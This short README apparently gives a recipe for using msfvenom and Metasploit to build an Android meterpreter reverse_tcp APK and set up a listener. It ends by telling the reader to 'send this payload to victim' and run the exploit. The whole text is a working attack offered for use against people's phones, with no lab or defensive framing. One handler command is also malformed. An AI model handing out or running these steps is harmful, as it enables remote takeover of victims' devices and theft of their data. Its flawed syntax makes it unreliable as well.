# make-Payload-in-metasploits
msf5> msfvenom -p android/meterpreter/reverse_tcp LHOST= (your IP) LPORT=8888 R > filename.apk 
[When Payload is create we are set multi handler]
msf5>set /multi/handler
msf5>set LHOST (your IP)
msf5>set LPORT 8888

[SEND THIS PAYLOAD TO VICTIM]
msf5>exploit


